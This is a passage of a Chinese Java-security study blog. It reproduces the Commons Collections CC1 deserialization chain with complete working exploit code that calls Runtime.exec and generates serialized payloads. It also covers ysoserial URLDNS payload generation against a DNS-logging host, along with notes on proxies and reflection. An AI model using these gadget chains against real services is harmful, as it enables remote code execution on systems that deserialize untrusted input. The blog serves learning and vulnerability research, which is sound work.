constructor.newInstance(Override.class, transformMap); 当然到这里还是没有结束，我们还要考虑两个问题 如何顺利进入 readObject 里的判断想要执行 setValue ，还得绕过两个 if，我们可以下断点调试看看。 1234567891011121314for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name))); &#125; &#125;&#125; memberValue 就是我们设置的 “key” &#x3D;&gt; “value” 键值对， 但是 memberType 为 null，第一层 if 判断都进不去了。 memberType 来自于 memberTypes 1Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); 获取注解类型的成员名称及其对应的类型。这个 Map 的键是成员的名称，值是成员的类型 这里注解类型我们传的是 Override 12public @interface Override &#123;&#125; 它是空的，所以没有成员名称及其对应的类型 12String name = memberValue.getKey();Class&lt;?&gt; memberType = memberTypes.get(name); memberValue.getKey() 会拿到键名 “key”,然后 memberTypes.get(name) ，就会去 Override 里面找有没有一个叫 “key” 的成员，就是说 memberTypes.get 的参数是我们之前 map.put(&quot;key&quot;,&quot;value&quot;) 的 “key“. 我们可以看看 Target 注释。 123public @interface Target &#123; ElementType[] value();&#125; 我们发现 Target 有一个 value 成员，所以键名取为 value，就能对应上了. 1map.put(&quot;value&quot;, &quot;value&quot;); 第二个 if 直接进来了，就不看了。 当然了，现在还是不能命令执行，又是什么问题呢，我们看看我们现在得到的代码 12345678910111213Transformer[] transformers = new Transformer[]&#123; new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);Map map = new HashMap();Map&lt;Object,Object&gt; transformMap = TransformedMap.decorate(map, null, chainedTransformer);map.put(&quot;value&quot;, &quot;value&quot;);Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);Object instance = constructor.newInstance(Target.class, transformMap); 我们都知道 1234567Map map = new HashMap(); Map&lt;Object,Object&gt; transformMap = TransformedMap.decorate(map, null, chainedTransformer); map.put(&quot;value&quot;, &quot;value&quot;); Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object instance = constructor.newInstance(Target.class, transformMap); 实现的是反序列化时走到 chainedTransformer.transform 时的参数是 Runtime.class 1chainedTransformer.transform(Runtime.class); 也就是说 AnnotationInvocationHandler 里的 readObject 的 memberValue.setValue 的参数得是 Runtime.class，但是可惜的是并不是这样 如何设置 chainedTransformer.transform 的参数为我们可控ConstantTransformer 直接看构造函数和 transform 方法 1234public ConstantTransformer(Object constantToReturn) &#123; super(); iConstant = constantToReturn;&#125; 123public Object transform(Object input) &#123; return iConstant;&#125; 巧，实在是太巧了，给人一种设计好的感觉，这个构造函数搭配 transform 方法就能够返回我们传的任意类。 怎么理解呢？虽然我们控制不了 setValue，因为写死了，那我们继续跟着链子走看一看，setValue 之后就会触发 checkSetValue ，这个我们之前已经推到过了，然后就会执行 valueTransformer.transform，valueTransformer 就是我们传的 chainedTransformer，参数就是 transformers。ok，可能还是看不出来我想表达什么，我们画个图 这是 chainedTransformer 的调用图，上面的结果作为下面的输入，也就是说我们只要保证传给 new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), 的参数是 Runtime.class 就行了 这个时候传进来的确实我们上面截图了的 **class.java.lang……**， 有什么办法呢，这就说到 ConstantTransformer 类了，既然它的 transform 方法能返回任意类，而 chainedTransformer 里面又在循环调用 transform ，那我们就可以把 ConstantTransformer 插入 transforms 里面，类似于这种效果 虽然最开始的参数是 class.java.lang……，但是 ConstantTransformer.transform 的返回值不是 transform 的参数，而是iConstant，也就是构造函数的参数，也就是 Runtime.class,这样就实现了完美绕过。 0x03 完整代码 12345678910111213141516171819202122232425262728293031323334353637383940414243import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.util.HashMap;import java.util.Map;public class Main &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map map = new HashMap(); Map&lt;Object,Object&gt; transformMap = TransformedMap.decorate(map, null, chainedTransformer); map.put(&quot;value&quot;, &quot;value&quot;); Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object instance = constructor.newInstance(Target.class, transformMap); serialize(instance); unserialize(); &#125; public static void serialize(Object obj) throws IOException &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;cc1.bin&quot;)); oos.writeObject(obj); &#125; public static void unserialize() throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;cc1.bin&quot;)); ois.readObject(); &#125;&#125; 0x04 拓展上面分析的知识 CC1 链的其中一种版本，还有一种版本也就是 ysoserial 里给的另一种链，我们可以看一下官方给的链子 1234567891011121314151617Gadget chain:\tObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() 可以发现后面都一样，区别就在于 transformedMap.checkSetValue 改成了 LazyMap.get ，我们看一下 LazyMap 的构造和 get 函数 123public static Map decorate(Map map, Transformer factory) &#123; return new LazyMap(map, factory);&#125; 123456789public Object get(Object key) &#123; // create value for key if key is not currently in the map if (map.containsKey(key) == false) &#123; Object value = factory.transform(key); map.put(key, value); return value; &#125; return map.get(key);&#125; 所以我们只要触发 factory.transform(key) 就行了，到时候 factory 传 ChainedTransformer，key 的话无所谓。 那么找谁调用了 get 方法，链子给的是 AnnotationInvocationHandler.invoke() 12345678910111213141516171819202122232425262728293031323334public Object invoke(Object proxy, Method method, Object[] args) &#123; String member = method.getName(); Class&lt;?&gt;[] paramTypes = method.getParameterTypes(); // Handle Object and Annotation methods if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp; paramTypes[0] == Object.class) return equalsImpl(args[0]); if (paramTypes.length != 0) throw new AssertionError(&quot;Too many parameters for an annotation method&quot;); switch(member) &#123; case &quot;toString&quot;: return toStringImpl(); case &quot;hashCode&quot;: return hashCodeImpl(); case &quot;annotationType&quot;: return type; &#125; // Handle annotation member accessors Object result = memberValues.get(member); if (result == null) throw new IncompleteAnnotationException(type, member); if (result instanceof ExceptionProxy) throw ((ExceptionProxy) result).generateException(); if (result.getClass().isArray() &amp;&amp; Array.getLength(result) != 0) result = cloneArray(result); return result;&#125; 可以看到第 22 行有 memberValues.get(member) ，memberValues 是可控的我们实例化的时候传 LazyMap 就行了 接下来思考两个问题 怎么绕过两个 if ？ 怎么找谁调用了 invoke paramTypes.length 要等于 0 才行，也就是传入的方法得是无参方法。我们回看 sun.reflect.annotation.AnnotationInvocationHandler ，会发现实际上这个类实际就是一个动态代理类要实现的接口，是一个InvocationHandler，也就是说我们可以通过动态代理来实现 invoke 方法的调用，既然有动态代理类了，那么我们代理对象找谁呢？ 如果将 AnnotationInvocationHandler 对象用 Proxy 进行动态代理那么在 readObject 的时候，只要调用任意方法，就会进入到 AnnotationInvocationHandler.invoke 创建一个动态代理对象 proxyMap，使用 handler （AnnotationInvocationHandler）作为调用处理器。每次对 proxyMap 的方法调用都会委托给 handler 的 invoke 方法，然后使用 proxyMap 创建了一个 AnnotationInvocationHandler 实例 1234567Map lazyMap = LazyMap.decorate(new HashMap(), chainedTransformer); Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);Map proxyMap = (Map) Proxy.newProxyInstance(Main.class.getClassLoader(), new Class[]&#123;Map.class&#125;, handler);Object instance = constructor.newInstance(Target.class, proxyMap); 我们发现 readObject 调用的 memberValues.entrySet() 正好是一个无参方法（proxyMap.entrySet），进入 invoke 后刚好解决了我们第一个问题 &#x3D;&#x3D;&#x3D;&#x3D;&gt; 绕过了两个 if，又不得不让人怀疑这是不是作者留的后门，实在是太巧了。 完整代码 12345678910111213141516171819/* * LazyMap * */ Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map lazyMap = LazyMap.decorate(new HashMap(), chainedTransformer); Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap); Map proxyMap = (Map) Proxy.newProxyInstance(Main.class.getClassLoader(), new Class[]&#123;Map.class&#125;, handler); Object instance = constructor.newInstance(Target.class, proxyMap);// serialize(instance); unserialize(); 下面是两条链的流程图 有时候调试上述POC的时候，会发现弹出了两个计算器，或者没有执行到readObject的时候就弹出了计 算器，这显然不是预期的结果，原因是什么呢？ 在使用Proxy代理了map对象后，我们在任何地方执行map的方法就会触发Payload弹出计算器，所 以，在本地调试代码的时候，因为调试器会在下面调用一些toString之类的方法，导致不经意间触发了 命令。 ysoserial对此有一些处理，它在POC的最后才将执行命令的Transformer数组设置到transformerChain 中，原因是避免本地生成序列化流的程序执行到命令。 为了调试方便我们也可以把 idea 调试的自动 tostring 和展示集合对象那俩选项关掉 0x05 思考写了很久其实也可以总结一下了，在找反序列化的过程中我们不断在问，“谁”调用了“xx”方法，这里的 xx 方法就是联系两个类的纽带，这里的“谁”就是我们要从后往前找的类，每次我们找到了这个类第一件事就是看这个类里的构造方法，或者触发该构造方法的函数，直到找到一个类能重写 readObject，当然这只是一个大致的思路，中间可能会碰到各种复杂的情况，我们都要一一 hack 下来。 代码审计（尤其是 java）真的是很难很枯燥，但是坚持到最后真的很酷很爽，这是我复现的第一条 cc 链，感触颇多，没有 p神 的文档和白组长的视频还有前辈们的资料靠我自己根本难以理解以及复现，最后以一首诗与诸君共勉吧，希望代码审计的路上我们都能不忘初心。 忆秦娥·娄山关毛泽东西风烈，长空雁叫霜晨月。霜晨月，马蹄声碎，喇叭声咽。雄关漫道真如铁，而今迈步从头越。从头越，苍山如海，残阳如血。八月一日","tags":["java 安全"],"categories":["java 安全","反序列化"]},{"title":"Java 代理","path":"/2024/08/03/java/开发/代理/","content":"java 静态代理与动态代理学习 0x01 意义在生产环境中，代理模式有许多实际的好处，能够提升系统的可维护性、扩展性和性能。当然这是 GPT 的回答，可能有点宽泛。举个例子吧，客户希望租一套房子，但由于没有时间和经验，不想自己去寻找和联系房主。中介公司提供服务，帮助客户找到符合要求的房子，安排看房、谈判租金、处理租赁合同等事务。房主通过中介公司租出房子，避免了自己直接接触大量客户的麻烦。 这里说的中介就相当于是 Java 里的代理，Java中的代理模式类似于上面的代理，我们也是为一个类（委托类）创建一个代理类，来代表它来对外提供功能。 0x02 静态代理代理类在编译时就已经确定，代理类和目标类都需要实现一致的接口。代理类直接持有目标类的引用，通过接口调用目标类的方法。 现在我们通过静态代理来实现上面说的找房的例子，中介代理房主，拥有租房，签合同的权限。 先实现同一个接口，代理类和目标类都需要实现同一个接口。在这里代理类就是中介，目标类就是房主。 我们先定义一个租房接口 123public interface RentService&#123; void rent(); &#125; 然后考虑实现房主类和中介类，这里房主只要考虑租房就行了，而中介要考虑的事就很多了（沟槽的鸣式 房主类 123456public static class HouseOwner implements RentService&#123; @Override public void rent() &#123; System.out.println(&quot;房东出租房子&quot;); &#125; &#125; 中介类 123456789101112public static class HouseProxy implements RentService&#123; private HouseOwner houseOwner; public HouseProxy(HouseOwner houseOwner)&#123; this.houseOwner = houseOwner; &#125; @Override public void rent() &#123; System.out.println(&quot;中介帮房东出租房子&quot;); houseOwner.rent(); System.out.println(&quot;中介签合同&quot;); System.out.println(&quot;中介收取中介费&quot;); &#125; 测试 12345public static void main(String[] args) &#123; HouseOwner houseOwner = new HouseOwner(); HouseProxy houseProxy = new HouseProxy(houseOwner); houseProxy.rent();&#125; 0x03 动态代理为什么有静态代理了还要用动态代理呢？动态代理相比于静态代理有什么优势呢？当场景稍微复杂一些的时候，静态代理的缺点也会暴露出来。 当需要代理多个类的时候，由于代理对象要实现与目标对象一致的接口，有两种方式： 只维护一个代理类，由这个代理类实现多个接口，但是这样就导致代理类过于庞大 新建多个代理类，每个目标对象对应一个代理类，但是这样会产生过多的代理类 当接口需要增加、删除、修改方法的时候，目标对象与代理类都要同时修改，不易维护。 实现 首先代理类不用再继承目标类的所有接口了，统一继承 InvocationHandler 类，还要重写 invoke 方法 12345678910public static class HouseProxy implements InvocationHandler&#123; private HouseOwner houseOwner; public HouseProxy(HouseOwner houseOwner)&#123; this.houseOwner = houseOwner; &#125; public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; method.invoke(houseOwner, args); return null; &#125; &#125; 可以看到利用了反射技术，难怪可以在类的创建阶段开始代理，然后利用 Proxy.newProxyInstance 创建代理 12345RentService proxyInstance = (RentService) Proxy.newProxyInstance( houseOwner.getClass().getClassLoader(), houseOwner.getClass().getInterfaces(), new HouseProxy(houseOwner) ); 调用代理方法 1proxyInstance.rent();// 断点调试发现 proxyInstance.rent() 就会进入代理类 HouseProxy 的 invoke 方法，我们可以打印一下方法名 1System.out.println(method.getName() + &quot;方法被调用&quot;); 可以发现代理类的实现确实抽象出来了，只要维护目标类就行了。 0x05 思考那么动态代理和反序列化漏洞又能扯上什么关系呢？ 我们都知道 URLDNS 利用的是 HashMap 调用了 hash 方法然后就会触发传入对象 key hash的 HashCode 方法，从而传入 URL 对象来触发 URL 的 hashCode 方法。假如 key 没有调用 hashCode 方法怎么办呢？比如调用的是 key.aaa 方法 那我们就可以找一个动态代理类，我们可以把动态代理类传给 key ，不过动态代理类执行的是什么方法都会执行 public Object invoke 函数，可能这个 invoke 函数实现了 hashCode 方法，并且这个动态代理类也接受一个类作为参数，invoke 调用了我们传给这个动态代理类的参数（这个参数就是我们传的类）的 hashCode 方法，那我们就可以把 URL 类传给 这个动态代理。","tags":["java 开发"],"categories":["开发"]},{"title":"URLDNS 链","path":"/2024/07/29/java/反序列化链/URLDNS/","content":"Java 反序列化第一条链 URLDNS 0x01 意义 URLDNS 就是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不 是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。 虽然这个“利⽤链”实际上是不能“利⽤”的，但因为其如下的优点，⾮常适合我们在检测反序列化漏洞时 使⽤： 使⽤Java内置的类构造，对第三⽅库没有依赖 在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞 既然提到了 ysoserial 那就简单了解一下吧，2015年Gabriel Lawrence (@gebl)和Chris Frohoff (@frohoff)在AppSecCali上提出了利⽤Apache Commons Collections来构造命令执⾏的利⽤ 链，并在年底因为对Weblogic、JBoss、Jenkins等著名应⽤的利⽤⽽ysoserial就是两位原作者在此议题中释出的⼀个⼯具，它可以让⽤户根据⾃⼰选择的利⽤链，⽣成反 序列化利⽤数据，通过将这些数据发送给⽬标，从⽽执⾏⽤户预先定义的命令（转载自 p 神 有了 ysoserial ,我们就能很方便的产生构造链，下面我们就来探讨 URLDNS 链的实现原理。 0x02 调试来看看 ysoserial 是怎么实现的吧，先去 yakit 产生一个可用域名，然后命令行生成 payload。 12java -jar ysoserial.jar URLDNS &quot;http://nwmenmnays.dgrh3.cn&quot;java -jar ysoserial.jar URLDNS &quot;http://nwmenmnays.dgrh3.cn&quot; &gt; urldns.bin 注意这里生成 urldns.bin 文件得在 kali 下完成，windows 下的话后面反序列化调试会报错。 得到后编写测试代码 1234567891011public class URLDNSTest &#123; public static void main(String[] args) throws IOException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;E:\\\\tools\\\\ysoserial\\\\URLDNS.ser&quot;)); try &#123; Object o = ois.readObject(); System.out.println(o); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 执行代码可以发现 yakit 已经收到了 dns 查询，下面动态调试看一下执行流程。 我们可以看到 ysoserial 源码已经给出了利用链 12345* Gadget Chain:* HashMap.readObject()* HashMap.putVal()* HashMap.hash()* URL.hashCode() 我们在这几处关键代码处打下断点，不能一下全打，因为 hash() 这个函数调用的太频繁了，干扰太多。打一个执行一下，先把 HashMap.putVal 断点打上。 1putVal(hash(key), key, value, false, false); 可以看到 key 值就是我们的 url 参数 然后进入 hash 函数 1234static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; 这里不要直接进 **hashCode()**，会进到 Object 里的。直接 f7 步进，来到 URL 类的 hashcode 函数下 1234567public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode;&#125; hashcode 值为 -1 进入 handler.hashCode 函数，注意到 359 行 1InetAddress addr = getHostAddress(u); 再次跟进 getHostAddress 方法 123456789101112131415161718protected synchronized InetAddress getHostAddress(URL u) &#123; if (u.hostAddress != null) return u.hostAddress; String host = u.getHost(); if (host == null || host.equals(&quot;&quot;)) &#123; return null; &#125; else &#123; try &#123; u.hostAddress = InetAddress.getByName(host); &#125; catch (UnknownHostException ex) &#123; return null; &#125; catch (SecurityException se) &#123; return null; &#125; &#125; return u.hostAddress;&#125; 这里 InetAddress.getByName(host) 的作用是根据主机名，获取其IP地址，在网络上其实就是⼀次 DNS查询。到这里就不必要再跟了，yakit 也收到 dns 查询了。 0x03 重写现在我们自己来实现，先梳理一下反序列化流程 123456HashMap-&gt;readObject()HashMap-&gt;hash()URL-&gt;hashCode()URLStreamHandler-&gt;hashCode()URLStreamHandler-&gt;getHostAddress()InetAddress-&gt;getByName() 先把 HashMap 和 url 对象创建出来 123HashMap ht = new HashMap();String url = &quot;http://wqyrtnekro.dgrh3.cn&quot;;URL u = new URL(url); 看 yso 源码 1ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. 我们也模仿着写，put 键值对 1ht.put(u, url); 然后序列化 123456789101112131415161718import java.io.*;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;public class URLDNS &#123; public static void serialize(Object obj) throws IOException &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;urldns.bin&quot;)); oos.writeObject(obj); &#125; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException &#123; HashMap ht = new HashMap(); String url = &quot;http://wqyrtnekro.dgrh3.cn&quot;; URL u = new URL(url); ht.put(u, url); serialize(ht); &#125;&#125; 序列化发现直接发出 dns 查询了，o.O? 动态看看什么情况。 原来是 ht.put 触发了 hash ，又走了一遍 putVal 到 getHostAddress 的流程 123public V put(K key, V value) &#123; return putVal(hash(key), key, value, false, true);&#125; 这样我们可以在 ht.put(u, url); 之前利用反射来使 URL 类的私有变量 hashcode 值不为 -1（默认初始值为 -1），这样就不会进入 handler.hashCode 了。 1234Class clazz = u.getClass();Field field = clazz.getDeclaredField(&quot;hashCode&quot;);field.setAccessible(true);field.set(u, 1); 再序列化就不会触发了，但是反序列话也不会触发，O.o? 反序列化动调看看，原来是我们之前设置 hashCode 变量为 1 然后直接走 12if (hashCode != -1)return hashCode; 所以这里 hashCode 仍然走的是这个逻辑，那我们想让他进入 1hashCode = handler.hashCode(this); 就只能再利用反射在 ht.put(u, url) 之后重新设置 hashCode 为 -1 123field.set(u, 1);ht.put(u, url);field.set(u, -1); 成功只在反序列化阶段触发 dns 查询 完整代码 1234567891011121314151617181920212223import java.io.*;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;public class URLDNS &#123; public static void serialize(Object obj) throws IOException &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;urldns.bin&quot;)); oos.writeObject(obj); &#125; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException &#123; HashMap ht = new HashMap(); String url = &quot;http://wqyrtnekro.dgrh3.cn&quot;; URL u = new URL(url); Class clazz = u.getClass(); Field field = clazz.getDeclaredField(&quot;hashCode&quot;); field.setAccessible(true); field.set(u, 1); ht.put(u, url); field.set(u, -1); serialize(ht); &#125;&#125; 0x04 思考复现完不禁会想，发现这条链的大佬是怎么想到这条链的？ 利用 HashMap 类作为接口是因为其实现了Serializable接口，重写了readObject,重写的 readObject 调用 hash 函数计算 key 的hashCode，而java.net.URL的hashCode在计算时会调用 getHostAddress 来解析域名, 从而发出 DNS 请求。 可以看到从 HashMap 到 URL 关键在于 hashCode 方法，这个方法点击的话跳转的是 Object 类，也就是说很多类都会有 hashCode方法，为什么偏偏挑选 HashMap 呢？我觉得 HashMap 调用了 hashcode 方法倒是其次，最主要的是它接受的参数类型没有限制，所以我们才能传 key 为 URL ，进而来到 URL 的 hashCode 方法里来触发 DNS 查询。","tags":["java 安全"],"categories":["java 安全","反序列化"]},{"title":"反射","path":"/2024/07/28/java/开发/反射/","content":"开启 java 安全学习第三站，java 反射 0x01 反射的意义存在即合理，那么为什么要有反射呢？反射能够使得程序在运行时动态地操作类和对象，包括创建对象，访问字段，调用方法等等。这样说可能稍许抽象，我们先反过来理解，正射是不是就是静态地操作类和对象，也就是说正常情况下我们知道一个类的样子，直接实例化即可。 12Apple apple = new Apple(); //直接初始化，「正射」apple.setPrice(4); 这种直接访问的方式清晰且直观，但在有些场景中需要动态调用调用操作这些成员，比如在程序运行时，根据数据库提供的类名或者方法名，或者基于字符串来动态实例化对象调用方法时就不适用了，就得用到 java 的反射机制。spring&#x2F;spring boot 或者 mybatis 就应用了大量反射机制，注解以及动态代理也运用到了反射机制。 0x02 反射原理反射的实现原理其关键在一个特殊的对象，我们称之为类对象，即 Class 对象。Class 对象是由 Java 虚拟机 JVM 在加载类时自动创建的，用于存储类的信息，通过它就能访问类的结构，以及对类本身以及它的实例进行操作。 JVM 创建 Class 的过程是这样的，当我们编写一个 .java 类并完成编译后，编译器将其转化为字节码并存储在 .class 文件中。接下来在类的加载中，虚拟机利用 Class Loader 读取 class 文件，将其中的字节码加载到内存中并利用其携带的信息来创建相应的 Class 对象。我们知道每个类在 JVM 中只加载一次，所以每个类都对应唯一的 Class 对象。 有一块镜子我们就能反射光线。那么在我看来 java 的反射中镜子就是 Class 对象。 0x03 反射实现获取 Class 对象 使用类字面常量，就是类的名称 + .class 这是最直接的方式，因为在编译时就确定了具体的类，仍然属于静态引用 1Class&lt;User&gt; userClass = User.class; 因为在编译时就确定了，已经明确了是个 User 类 的 Class ，所以泛型直接给 User。 使用对象的 getClass 方法，如果你已知一个对象，那么可以调用它的 getClass 方法来获取它的 Class 对象。 12User user = new User(&quot;she11F&quot;,18);Class&lt;?&gt; clazz = user.getClass(); 这里泛型用通配符是因为这个 Class 对象是在程序运行时从 user 实例获取的， user 实例的具体类型只能在程序运行时才确定，所以我们在编译阶段无法确定 Class 对象的具体类型，所以泛型是通配符。 Class 类的 forName 静态方法 这种方法用于程序运行时动态加载指定的类，并返回该类的 Class 对象实例。同常用于类名在编译时不可知的场景中 1Class&lt;?&gt; clazz = Class.forName(&quot;User&quot;); 这种方法会触发类的初始化，静态块会被执行。 获取类的字段 getDeclaredFields() 返回类型是 Field 类型的数组 1234Field[] fields = clazz.getDeclaredFields(); for (Field field : fields) &#123; System.out.println(field.getName()); &#125; getFields(); 只获取 public 字段（如果有父类的话也可以获得父类的所有 public 字段 1Field[] fields = clazz.getFields(); ​\t继承 Person 类后 ​\t如果想获得父类所有字段怎么办？可以先获取父类的 Class 对象，再获取其 getDeclaredFields() 1Field[] fields = clazz.getSuperclass().getDeclaredFields(); getDeclaredField() 获取指定字段 1Field field = clazz.getDeclaredField(&quot;name&quot;); 要获取字段值的话可以用 get 方法，传递的参数是类的实例化对象 123Field field = clazz.getDeclaredField(&quot;name&quot;);User user = new User(&quot;she11F&quot;, 18);System.out.println(field.get(user)); 如果是想获得静态变量的话传 null 即可 12Field field = clazz.getDeclaredField(&quot;sex&quot;);System.out.println(field.get(null)); 访问私有变量的话要设置访问权限为可达 123Field field = clazz.getDeclaredField(&quot;email&quot;);field.setAccessible(true);System.out.println(field.get(null)); 当然出了获取值也可以设置值，get 换成 set 即可 调用方法getDeclaredMethods 同理，这样就能获取所有方法名 1234Method[] methods = clazz.getDeclaredMethods(); for(Method method : methods)&#123; System.out.println(method.getName()); &#125; 来看一下一般方法怎么通过反射调用吧。 1234Class&lt;?&gt; clazz = Class.forName(&quot;User&quot;);User user = new User();Method method = clazz.getMethod(&quot;getName&quot;);System.out.println(method.invoke(user)); 获取方法后用 invoke() 即可执行方法，静态方法或者私有方法的话和获取字段值一样的规则 invoke 的作用是执行方法，它的第一个参数是： 如果这个方法是一个普通方法，那么第一个参数是类对象 如果这个方法是一个静态方法，那么第一个参数是类 这也比较好理解了，我们正常执行方法是 [1].method([2], [3], [4]…) ，其实在反射里就是 method.invoke([1], [2], [3], [4]…) 。 1234// 静态System.out.println(method.invoke(null));// 私有method.setAccessible(true); 那么如何传参呢？ 获取方法时，第二个参数设置为待调用函数的参数的 Class 对象 1Method method = clazz.getMethod(&quot;getName&quot;,String.class); 调用 invoke 时，即可传递参数 12Method method = clazz.getMethod(&quot;getName&quot;,String.class);System.out.println(method.invoke(null,&quot;makka_pakka&quot;)); 0x04 反射创建类的实例在反射中，我们通常获取类的构造器来创建实例。 1Constructor constructor = clazz.getDeclaredConstructor(String.class, int.class); 实例化 1Object obj = constructor.newInstance(&quot;she11F&quot;, 18); 获得变量和调用实例方法其实和之前是一样的，唯一区别就是对象都换成了 newInstance 实例化出的对象。 1234567Class&lt;?&gt; clazz = Class.forName(&quot;User&quot;);Constructor constructor = clazz.getConstructor(String.class, int.class);Object obj = constructor.newInstance(&quot;she11F&quot;, 18);Field field = clazz.getDeclaredField(&quot;name&quot;);System.out.println(field.get(obj));Method method = clazz.getMethod(&quot;getName&quot;,String.class);System.out.println(method.invoke(obj,&quot;makka_pakka&quot;)); 我们可以试着用反射来构造命令执行 12Runtime runtime = Runtime.getRuntime();runtime.exec(&quot;calc&quot;); 换成反射写法 12Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.Runtime&quot;);clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.newInstance(),&quot;calc&quot;); 这里直接 clazz.newInstance() 只有有无参构造器的时候才能这样写，有参的话就可以用 Constructor（当然无参也可以用 可惜报错了 因为 Runtime 的构造方法是私有的，而 newInstance 不能调用私有的构造方法。正确的做法是使用 Runtime 类提供的静态方法 getRuntime() 来获取唯一的 Runtime 实例，然后调用 exec 方法： 12Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.Runtime&quot;);clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz),&quot;calc&quot;);","tags":["java 开发"],"categories":["开发"]},{"title":"ctfshow 西瓜杯 Web 复现","path":"/2024/07/24/ctf/XGBCTF/","content":"周末出去玩了，没打西瓜杯，直接复现吧 tpdoor下载附件先 123456789101112131415161718192021222324&lt;?phpnamespace app\\controller;use app\\BaseController;use think\\facade\\Db;class Index extends BaseController&#123; protected $middleware = [&#x27;think\\middleware\\AllowCrossDomain&#x27;,&#x27;think\\middleware\\CheckRequestCache&#x27;,&#x27;think\\middleware\\LoadLangPack&#x27;,&#x27;think\\middleware\\SessionInit&#x27;]; public function index($isCache = false , $cacheTime = 3600) &#123; if($isCache == true)&#123; $config = require 